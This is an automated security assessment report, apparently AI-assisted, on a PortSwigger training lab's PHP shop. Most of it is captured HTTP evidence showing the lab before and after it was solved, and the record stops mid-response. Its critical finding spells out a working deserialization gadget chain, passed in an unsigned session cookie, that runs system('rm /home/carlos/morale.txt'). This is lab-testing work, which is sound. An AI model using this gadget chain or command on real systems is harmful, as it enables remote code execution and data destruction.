# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — rce RCE via insecure PHP deserialization of session cookie — custom gadget chain deletes /home/carlos/morale.txt](#finding-1)
    - [2. HIGH — session Insecure deserialization of session cookie — unsigned, forgeable PHP object identity](#finding-2)
    - [3. MEDIUM — info-disclosure PHP source code disclosure via editor backup (~) at /cgi-bin/libs/CustomTemplate.php~](#finding-3)
    - [4. LOW — rate-limit No brute-force protection / rate limiting on login](#finding-4)
    - [5. LOW — burp Strict transport security not enforced (2 URLs)](#finding-5)
    - [6. INFO — burp TLS certificate](#finding-6)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [7. CRITICAL — rce PHP object injection via session cookie — likely escalates to remote code execution](#finding-7)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr61ymp9-ze50u4` |
| Target | https://0a14001003ba06e480069a13001b0048.web-security-academy.net/ |
| Started | 2026-07-04T07:40:25.888Z |
| Generated | 2026-07-04T09:35:01.090Z |
| Phase | report |
| Screens | 4 mapped · 4 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 6 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `*.web-security-academy.net`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

6 finding(s): 1 critical, 1 high, 1 medium, 2 low, 1 info

_Plus 1 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [rce] RCE via insecure PHP deserialization of session cookie — custom gadget chain deletes /home/carlos/morale.txt

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0a14001003ba06e480069a13001b0048.web-security-academy.net/

The session cookie is an UNSIGNED base64-encoded PHP-serialized object (default: O:4:"User":2:{username, access_token}). It has no HMAC/signature, so an attacker can replace it with an arbitrary serialized object which the server feeds to unserialize() on every request (any endpoint; /my-account used here). Using the class source disclosed at /cgi-bin/libs/CustomTemplate.php~, a custom gadget chain achieves arbitrary OS command execution: CustomTemplate::__wakeup() -> build_product() -> new Product(default_desc_type, desc); Product::__construct() evaluates desc->{default_desc_type}; with desc = a DefaultMap, that dynamic property read fires DefaultMap::__get() -> call_user_func(callback, name). Setting callback=system and default_desc_type="rm /home/carlos/morale.txt" executes system("rm /home/carlos/morale.txt"). Delivering the gadget in the session cookie deleted the target file, which flipped the lab to solved. This is arbitrary command execution as the web app user (full server compromise class).

**Reproduction**

```
1) GET /cgi-bin/libs/CustomTemplate.php~ to obtain class source. 2) Build gadget: O:14:"CustomTemplate":2:{ [private default_desc_type]="rm /home/carlos/morale.txt"; [private desc]=O:10:"DefaultMap":1:{ [private callback]="system" } } using null-byte private-property mangling. 3) base64-encode and set as the session cookie, then GET /my-account -> unserialize fires __wakeup -> Product -> DefaultMap::__get -> call_user_func("system","rm /home/carlos/morale.txt"). CONFIRMED via probe_scenario (WORKFLOW MANIPULATION ACCEPTED): benign wiener session BEFORE exploit -> home page lab NOT solved (marker absent, ev-mr658712-2g); after gadget delivery, two stable steady-state home-page reads return HTTP 200 identical 14438-byte bodies containing 'academyLabBanner is-solved' (ev-mr65g3sx-2l, ev-mr65g821-2m) = morale.txt deleted.
```

**Evidence**

- Evidence `ev-mr658712-2g` — `artifacts/_/ev-mr658712-2g/`

Request:

```http
GET / HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 11627
content-type: text/html; charset=utf-8
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/8.jpg">
                            <h3>Folding Gadgets</h3>
                            <img src="/resources/images/rating2.png">
                            $21.07
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/29.jpg">
                            <h3>Waterproof Tea Bags</h3>
                            <img src="/resources/images/rating1.png">
                            $9.00
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/30.jpg">
                            <h3>Giant Pillow Thing</h3>
                            <img src="/resources/images/rating4.png">
                            $74.00
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/61.jpg">
                            <h3>Safety First</h3>
                            <img src="/resources/images/rating1.png">
                            $85.24
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/73.jpg">
                            <h3>Beat the Vacation Traffic</h3>
                            <img src="/resources/images/rating3.png">
                            $34.40
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/58.jpg">
                            <h3>There is No &apos;I&apos; in Team</h3>
                            <img src="/resources/images/rating5.png">
                            $94.92
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating1.png">
                            $70.58
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating3.png">
                            $22.00
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/4.jpg">
                            <h3>BURP Protection</h3>
                            <img src="/resources/images/rating5.png">
                            $40.74
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/16.jpg">
                            <h3>Photobomb Backdrops</h3>
                            <img src="/resources/images/rating4.png">
                            $4.63
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/6.jpg">
                            <h3>Com-Tool</h3>
                            <img src="/resources/images/rating1.png">
                            $26.45
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/23.jpg">
                            <h3>Sprout More Brain Power</h3>
                            <img src="/resources/images/rating1.png">
                            $44.57
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/45.jpg">
                            <h3>ZZZZZZ Bed - Your New Home Office</h3>
                            <img src="/resources/images/rating2.png">
                            $26.76
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/65.jpg">
                            <h3>Eco Boat</h3>
                            <img src="/resources/images/rating5.png">
                            $20.53
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating1.png">
                            $71.28
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/36.jpg">
                            <h3>Caution Sign</h3>
                            <img src="/resources/images/rating2.png">
                            $44.69
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/48.jpg">
                            <h3>BBQ Suitcase</h3>
                            <img src="/resources/images/rating3.png">
                            $56.53
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating2.png">
                            $39.50
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/46.jpg">
                            <h3>Hitch A Lift</h3>
                            <img src="/resources/images/rating3.png">
                            $46.08
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/51.jpg">
                            <h3>Real Life Photoshopping</h3>
                            <img src="/resources/images/rating3.png">
                            $11.90
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr65g3sx-2l` — `artifacts/_/ev-mr65g3sx-2l/`

Request:

```http
GET / HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 14438
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/8.jpg">
                            <h3>Folding Gadgets</h3>
                            <img src="/resources/images/rating2.png">
                            $21.07
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/29.jpg">
                            <h3>Waterproof Tea Bags</h3>
                            <img src="/resources/images/rating1.png">
                            $9.00
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/30.jpg">
                            <h3>Giant Pillow Thing</h3>
                            <img src="/resources/images/rating4.png">
                            $74.00
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/61.jpg">
                            <h3>Safety First</h3>
                            <img src="/resources/images/rating1.png">
                            $85.24
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/73.jpg">
                            <h3>Beat the Vacation Traffic</h3>
                            <img src="/resources/images/rating3.png">
                            $34.40
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/58.jpg">
                            <h3>There is No &apos;I&apos; in Team</h3>
                            <img src="/resources/images/rating5.png">
                            $94.92
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating1.png">
                            $70.58
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating3.png">
                            $22.00
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/4.jpg">
                            <h3>BURP Protection</h3>
                            <img src="/resources/images/rating5.png">
                            $40.74
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/16.jpg">
                            <h3>Photobomb Backdrops</h3>
                            <img src="/resources/images/rating4.png">
                            $4.63
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/6.jpg">
                            <h3>Com-Tool</h3>
                            <img src="/resources/images/rating1.png">
                            $26.45
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/23.jpg">
                            <h3>Sprout More Brain Power</h3>
                            <img src="/resources/images/rating1.png">
                            $44.57
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/45.jpg">
                            <h3>ZZZZZZ Bed - Your New Home Office</h3>
                            <img src="/resources/images/rating2.png">
                            $26.76
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/65.jpg">
                            <h3>Eco Boat</h3>
                            <img src="/resources/images/rating5.png">
                            $20.53
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating1.png">
                            $71.28
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/36.jpg">
                            <h3>Caution Sign</h3>
                            <img src="/resources/images/rating2.png">
                            $44.69
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/48.jpg">
                            <h3>BBQ Suitcase</h3>
                            <img src="/resources/images/rating3.png">
                            $56.53
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating2.png">
                            $39.50
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/46.jpg">
                            <h3>Hitch A Lift</h3>
                            <img src="/resources/images/rating3.png">
                            $46.08
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/51.jpg">
                            <h3>Real Life Photoshopping</h3>
                            <img src="/resources/images/rating3.png">
                            $11.90
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr65g821-2m` — `artifacts/_/ev-mr65g821-2m/`

Request:

```http
GET / HTTP/1.1
Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 14438
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/8.jpg">
                            <h3>Folding Gadgets</h3>
                            <img src="/resources/images/rating2.png">
                            $21.07
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/29.jpg">
                            <h3>Waterproof Tea Bags</h3>
                            <img src="/resources/images/rating1.png">
                            $9.00
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/30.jpg">
                            <h3>Giant Pillow Thing</h3>
                            <img src="/resources/images/rating4.png">
                            $74.00
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/61.jpg">
                            <h3>Safety First</h3>
                            <img src="/resources/images/rating1.png">
                            $85.24
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/73.jpg">
                            <h3>Beat the Vacation Traffic</h3>
                            <img src="/resources/images/rating3.png">
                            $34.40
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/58.jpg">
                            <h3>There is No &apos;I&apos; in Team</h3>
                            <img src="/resources/images/rating5.png">
                            $94.92
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating1.png">
                            $70.58
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating3.png">
                            $22.00
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/4.jpg">
                            <h3>BURP Protection</h3>
                            <img src="/resources/images/rating5.png">
                            $40.74
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/16.jpg">
                            <h3>Photobomb Backdrops</h3>
                            <img src="/resources/images/rating4.png">
                            $4.63
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/6.jpg">
                            <h3>Com-Tool</h3>
                            <img src="/resources/images/rating1.png">
                            $26.45
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
